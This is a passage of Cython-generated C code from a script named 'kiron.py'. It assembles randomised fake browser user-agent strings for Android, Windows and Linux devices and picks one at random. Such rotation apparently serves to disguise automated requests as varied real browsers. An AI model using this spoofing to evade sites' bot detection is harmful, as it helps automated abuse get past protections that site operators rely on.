 *      cudiua4 = f"Mozilla/5.0 (Linux; U; Android 10; en-us; "+mmp+" Build/"+bbbb+") AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+chorom+f" Mobile Safari/537.36 XiaoMi/MiuiBrowser/18.0.{str(rr(11111,66666))} swan-mibrowser"             # <<<<<<<<<<<<<<
 *      cudiua5 = f"Mozilla/5.0 (Linux; arm_64; Android 10; "+str(mobile)+f" Build/{str(bbbb)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+chorom+f" YaApp_Android/{str(rr(111,999))}.10.1 YaSearchBrowser/{str(rr(11,44))}.{str(rr(11,44))}.1 BroPP/1.0 SA/3 Mobile Safari/537.36"
 *      cudiua6 = f"Mozilla/5.0 (Windows NT {str(rr(7,11))}.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+chorom+f" Safari/537.36 Edg/{str(rr(11,99))}.0.{str(rr(311,999))}.59"
 */
  __pyx_t_4 = PyNumber_Add(__pyx_kp_u_Mozilla_5_0_Linux_U_Android_10_e, __pyx_v_mmp); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 350, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_2 = PyNumber_Add(__pyx_t_4, __pyx_kp_s_Build); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 350, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = PyNumber_Add(__pyx_t_2, __pyx_v_bbbb); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 350, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyNumber_Add(__pyx_t_4, __pyx_kp_s_AppleWebKit_537_36_KHTML_like_G_2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 350, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = PyNumber_Add(__pyx_t_2, __pyx_v_chorom); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 350, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyTuple_New(3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 350, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_6 = 0;
  __pyx_t_7 = 127;
  __Pyx_INCREF(__pyx_kp_u_Mobile_Safari_537_36_XiaoMi_Miu);
  __pyx_t_6 += 46;
  __Pyx_GIVEREF(__pyx_kp_u_Mobile_Safari_537_36_XiaoMi_Miu);
  PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_kp_u_Mobile_Safari_537_36_XiaoMi_Miu);
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_rr); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 350, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__49, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 350, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_Str(__pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 350, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 350, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_2, 1, __pyx_t_1);
  __pyx_t_1 = 0;
  __Pyx_INCREF(__pyx_kp_u_swan_mibrowser);
  __pyx_t_6 += 15;
  __Pyx_GIVEREF(__pyx_kp_u_swan_mibrowser);
  PyTuple_SET_ITEM(__pyx_t_2, 2, __pyx_kp_u_swan_mibrowser);
  __pyx_t_1 = __Pyx_PyUnicode_Join(__pyx_t_2, 3, __pyx_t_6, __pyx_t_7); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 350, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyNumber_Add(__pyx_t_4, __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 350, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_v_cudiua4 = __pyx_t_2;
  __pyx_t_2 = 0;

  /* "kiron.py":351
 *      cudiua3 = f"NokiaX{str(rr(1,9))}-0{str(rr(1,9))}/{str(rr(1,9))}.{str(rr(1,9))} ({str(rr(1,9))}Profile/MIDP-2.1 Configuration/CLDC-1.1UNTRUSTED/2.0"
 *      cudiua4 = f"Mozilla/5.0 (Linux; U; Android 10; en-us; "+mmp+" Build/"+bbbb+") AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+chorom+f" Mobile Safari/537.36 XiaoMi/MiuiBrowser/18.0.{str(rr(11111,66666))} swan-mibrowser"
 *      cudiua5 = f"Mozilla/5.0 (Linux; arm_64; Android 10; "+str(mobile)+f" Build/{str(bbbb)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+chorom+f" YaApp_Android/{str(rr(111,999))}.10.1 YaSearchBrowser/{str(rr(11,44))}.{str(rr(11,44))}.1 BroPP/1.0 SA/3 Mobile Safari/537.36"             # <<<<<<<<<<<<<<
 *      cudiua6 = f"Mozilla/5.0 (Windows NT {str(rr(7,11))}.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+chorom+f" Safari/537.36 Edg/{str(rr(11,99))}.0.{str(rr(311,999))}.59"
 *      cudiua7 = f"Mozilla/5.0 (X11; Linux x86_64; Android {str(rr(7,13))}; {str(mobile)} Build/{str(bbbb)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(chorom)} Safari/{str(rr(511,599))}.{str(rr(30,39))}"
 */
  __pyx_t_2 = __Pyx_PyObject_Str(__pyx_v_mobile); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 351, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_1 = PyNumber_Add(__pyx_kp_u_Mozilla_5_0_Linux_arm_64_Android, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 351, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyTuple_New(3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 351, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_6 = 0;
  __pyx_t_7 = 127;
  __Pyx_INCREF(__pyx_kp_u_Build);
  __pyx_t_6 += 7;
  __Pyx_GIVEREF(__pyx_kp_u_Build);
  PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_kp_u_Build);
  __pyx_t_4 = __Pyx_PyObject_Str(__pyx_v_bbbb); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 351, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 351, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_2, 1, __pyx_t_3);
  __pyx_t_3 = 0;
  __Pyx_INCREF(__pyx_kp_u_AppleWebKit_537_36_KHTML_like_G_3);
  __pyx_t_6 += 48;
  __Pyx_GIVEREF(__pyx_kp_u_AppleWebKit_537_36_KHTML_like_G_3);
  PyTuple_SET_ITEM(__pyx_t_2, 2, __pyx_kp_u_AppleWebKit_537_36_KHTML_like_G_3);
  __pyx_t_3 = __Pyx_PyUnicode_Join(__pyx_t_2, 3, __pyx_t_6, __pyx_t_7); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 351, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyNumber_Add(__pyx_t_1, __pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 351, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyNumber_Add(__pyx_t_2, __pyx_v_chorom); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 351, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyTuple_New(7); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 351, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_6 = 0;
  __pyx_t_7 = 127;
  __Pyx_INCREF(__pyx_kp_u_YaApp_Android);
  __pyx_t_6 += 15;
  __Pyx_GIVEREF(__pyx_kp_u_YaApp_Android);
  PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_kp_u_YaApp_Android);
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_rr); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 351, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__41, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 351, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_Str(__pyx_t_4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 351, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 351, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_2, 1, __pyx_t_4);
  __pyx_t_4 = 0;
  __Pyx_INCREF(__pyx_kp_u_10_1_YaSearchBrowser);
  __pyx_t_6 += 22;
  __Pyx_GIVEREF(__pyx_kp_u_10_1_YaSearchBrowser);
  PyTuple_SET_ITEM(__pyx_t_2, 2, __pyx_kp_u_10_1_YaSearchBrowser);
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_rr); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 351, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple__50, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 351, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyObject_Str(__pyx_t_1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 351, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 351, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_2, 3, __pyx_t_1);
  __pyx_t_1 = 0;
  __Pyx_INCREF(__pyx_kp_u__11);
  __pyx_t_6 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__11);
  PyTuple_SET_ITEM(__pyx_t_2, 4, __pyx_kp_u__11);
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_rr); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 351, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__50, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 351, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_Str(__pyx_t_4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 351, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 351, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_2, 5, __pyx_t_4);
  __pyx_t_4 = 0;
  __Pyx_INCREF(__pyx_kp_u_1_BroPP_1_0_SA_3_Mobile_Safari);
  __pyx_t_6 += 38;
  __Pyx_GIVEREF(__pyx_kp_u_1_BroPP_1_0_SA_3_Mobile_Safari);
  PyTuple_SET_ITEM(__pyx_t_2, 6, __pyx_kp_u_1_BroPP_1_0_SA_3_Mobile_Safari);
  __pyx_t_4 = __Pyx_PyUnicode_Join(__pyx_t_2, 7, __pyx_t_6, __pyx_t_7); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 351, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyNumber_Add(__pyx_t_3, __pyx_t_4); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 351, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_v_cudiua5 = __pyx_t_2;
  __pyx_t_2 = 0;

  /* "kiron.py":352
 *      cudiua4 = f"Mozilla/5.0 (Linux; U; Android 10; en-us; "+mmp+" Build/"+bbbb+") AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+chorom+f" Mobile Safari/537.36 XiaoMi/MiuiBrowser/18.0.{str(rr(11111,66666))} swan-mibrowser"
 *      cudiua5 = f"Mozilla/5.0 (Linux; arm_64; Android 10; "+str(mobile)+f" Build/{str(bbbb)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+chorom+f" YaApp_Android/{str(rr(111,999))}.10.1 YaSearchBrowser/{str(rr(11,44))}.{str(rr(11,44))}.1 BroPP/1.0 SA/3 Mobile Safari/537.36"
 *      cudiua6 = f"Mozilla/5.0 (Windows NT {str(rr(7,11))}.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+chorom+f" Safari/537.36 Edg/{str(rr(11,99))}.0.{str(rr(311,999))}.59"             # <<<<<<<<<<<<<<
 *      cudiua7 = f"Mozilla/5.0 (X11; Linux x86_64; Android {str(rr(7,13))}; {str(mobile)} Build/{str(bbbb)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(chorom)} Safari/{str(rr(511,599))}.{str(rr(30,39))}"
 *      cudiua8 = f"Mozilla/5.0 (Linux; U; Android 13; pt-pt; "+str(mobile)+f") AppleWebKit/534.30 (KHTML, like Gecko) Version/{str(rr(11,99))}.0.{str(rr(1111,9999))}.{str(rr(110,599))} Mobile Safari/{str(rr(511,599))}.{str(rr(30,39))}"
 */
  __pyx_t_2 = PyTuple_New(3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 352, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_6 = 0;
  __pyx_t_7 = 127;
  __Pyx_INCREF(__pyx_kp_u_Mozilla_5_0_Windows_NT);
  __pyx_t_6 += 24;
  __Pyx_GIVEREF(__pyx_kp_u_Mozilla_5_0_Windows_NT);
  PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_kp_u_Mozilla_5_0_Windows_NT);
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_rr); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 352, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple__51, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 352, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyObject_Str(__pyx_t_3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 352, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 352, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_2, 1, __pyx_t_3);
  __pyx_t_3 = 0;
  __Pyx_INCREF(__pyx_kp_u_0_Win64_x64_AppleWebKit_537_36);
  __pyx_t_6 += 62;
  __Pyx_GIVEREF(__pyx_kp_u_0_Win64_x64_AppleWebKit_537_36);
  PyTuple_SET_ITEM(__pyx_t_2, 2, __pyx_kp_u_0_Win64_x64_AppleWebKit_537_36);
  __pyx_t_3 = __Pyx_PyUnicode_Join(__pyx_t_2, 3, __pyx_t_6, __pyx_t_7); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 352, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyNumber_Add(__pyx_t_3, __pyx_v_chorom); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 352, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyTuple_New(5); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 352, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_6 = 0;
  __pyx_t_7 = 127;
  __Pyx_INCREF(__pyx_kp_u_Safari_537_36_Edg);
  __pyx_t_6 += 19;
  __Pyx_GIVEREF(__pyx_kp_u_Safari_537_36_Edg);
  PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_kp_u_Safari_537_36_Edg);
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_rr); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 352, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple__42, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 352, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyObject_Str(__pyx_t_1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 352, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 352, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_3, 1, __pyx_t_1);
  __pyx_t_1 = 0;
  __Pyx_INCREF(__pyx_kp_u_0);
  __pyx_t_6 += 3;
  __Pyx_GIVEREF(__pyx_kp_u_0);
  PyTuple_SET_ITEM(__pyx_t_3, 2, __pyx_kp_u_0);
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_rr); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 352, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__52, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 352, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_Str(__pyx_t_4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 352, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 352, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_3, 3, __pyx_t_4);
  __pyx_t_4 = 0;
  __Pyx_INCREF(__pyx_kp_u_59);
  __pyx_t_6 += 3;
  __Pyx_GIVEREF(__pyx_kp_u_59);
  PyTuple_SET_ITEM(__pyx_t_3, 4, __pyx_kp_u_59);
  __pyx_t_4 = __Pyx_PyUnicode_Join(__pyx_t_3, 5, __pyx_t_6, __pyx_t_7); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 352, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyNumber_Add(__pyx_t_2, __pyx_t_4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 352, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_v_cudiua6 = __pyx_t_3;
  __pyx_t_3 = 0;

  /* "kiron.py":353
 *      cudiua5 = f"Mozilla/5.0 (Linux; arm_64; Android 10; "+str(mobile)+f" Build/{str(bbbb)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+chorom+f" YaApp_Android/{str(rr(111,999))}.10.1 YaSearchBrowser/{str(rr(11,44))}.{str(rr(11,44))}.1 BroPP/1.0 SA/3 Mobile Safari/537.36"
 *      cudiua6 = f"Mozilla/5.0 (Windows NT {str(rr(7,11))}.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+chorom+f" Safari/537.36 Edg/{str(rr(11,99))}.0.{str(rr(311,999))}.59"
 *      cudiua7 = f"Mozilla/5.0 (X11; Linux x86_64; Android {str(rr(7,13))}; {str(mobile)} Build/{str(bbbb)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(chorom)} Safari/{str(rr(511,599))}.{str(rr(30,39))}"             # <<<<<<<<<<<<<<
 *      cudiua8 = f"Mozilla/5.0 (Linux; U; Android 13; pt-pt; "+str(mobile)+f") AppleWebKit/534.30 (KHTML, like Gecko) Version/{str(rr(11,99))}.0.{str(rr(1111,9999))}.{str(rr(110,599))} Mobile Safari/{str(rr(511,599))}.{str(rr(30,39))}"
 *      ua = random.choice([cudiua1,cudiua2,cudiua3,cudiua4,cudiua5,cudiua6,cudiua7,cudiua8])
 */
  __pyx_t_3 = PyTuple_New(12); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 353, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_6 = 0;
  __pyx_t_7 = 127;
  __Pyx_INCREF(__pyx_kp_u_Mozilla_5_0_X11_Linux_x86_64_And);
  __pyx_t_6 += 40;
  __Pyx_GIVEREF(__pyx_kp_u_Mozilla_5_0_X11_Linux_x86_64_And);
  PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_kp_u_Mozilla_5_0_X11_Linux_x86_64_And);
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_rr); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 353, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple__53, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 353, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyObject_Str(__pyx_t_2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 353, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 353, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_3, 1, __pyx_t_2);
  __pyx_t_2 = 0;
  __Pyx_INCREF(__pyx_kp_u__54);
  __pyx_t_6 += 2;
  __Pyx_GIVEREF(__pyx_kp_u__54);
  PyTuple_SET_ITEM(__pyx_t_3, 2, __pyx_kp_u__54);
